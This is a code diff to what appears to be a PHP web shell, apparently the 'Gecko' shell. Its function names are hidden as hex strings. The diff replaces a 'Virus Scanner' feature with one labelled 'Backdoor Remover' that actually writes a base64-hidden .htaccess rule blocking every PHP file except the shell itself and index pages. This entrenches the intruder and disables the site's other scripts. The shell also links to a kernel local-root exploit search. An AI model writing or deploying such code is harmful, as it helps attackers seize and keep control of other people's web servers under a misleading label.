@@ -34,7 +34,8 @@ $Array = [
     '726d646972', // r m d i r => 29
     '756e6c696e6b', // u n l i n k => 30
     '66696c65', // f i l e => 31
-    '6d756c7469706172742f666f726d2d64617461' // m u l t i p a r t / f o r m d a t a => 32
+    '6d756c7469706172742f666f726d2d64617461', // m u l t i p a r t / f o r m d a t a => 32
+    '444f43554d454e545f524f4f54' // r o o t d o c => 33 
 ];
 $hitung_array = count($Array);
 for ($i = 0; $i < $hitung_array; $i++) {
@@ -530,7 +531,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
                     <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
-                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&virus_scanner=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Virus Scanner</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Remover</a></li>
                     <li><a href="https://github.com/MadExploits" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
                 </ul>
             </div>
@@ -760,23 +761,14 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 
 <?php
 
-if ($_GET['virus_scanner'] == True) {
-    // Check if windows or Linux
-    // refrence https://www.niagahoster.co.id/blog/apa-itu-backdoor/
-    if ($fungsi[11] == "nt") {
-        $cmd = _mad_cmd("findstr /r /s /n /C:'eval' && findstr /r /s /n /C:'passthru'>gecko_virus.txt");
-        if ($cmd) {
-            echo success();
-        } else {
-            echo failed();
-        }
+if ($_GET['backdoor'] == True) {
+    $base64_text = "PEZpbGVzTWF0Y2ggIi5waCp8UGgqfHBIKnxQSCoiPgogICAgT3JkZXIgRGVueSxBbGxvdwogICAgRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJnZWNrby5waHB8aW5kZXgucGhwfGluZGV4Lmh0bWwiPgogICAgT3JkZXIgRGVueSwgQWxsb3cKICAgIEFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4=";
+    $document_root = $_SERVER[$fungsi[33]];
+    $cmd = _mad_cmd("echo '" . base64_decode($base64_text) . "' >> " . $document_root . "/.htaccess");
+    if ($cmd) {
+        echo success();
     } else {
-        $cmd = _mad_cmd("grep -Rn 'eval' && grep -Rn 'passthru' > gecko_virus.txt");
-        if ($cmd) {
-            echo success();
-        } else {
-            echo failed();
-        }
+        echo failed();
     }
 }
 
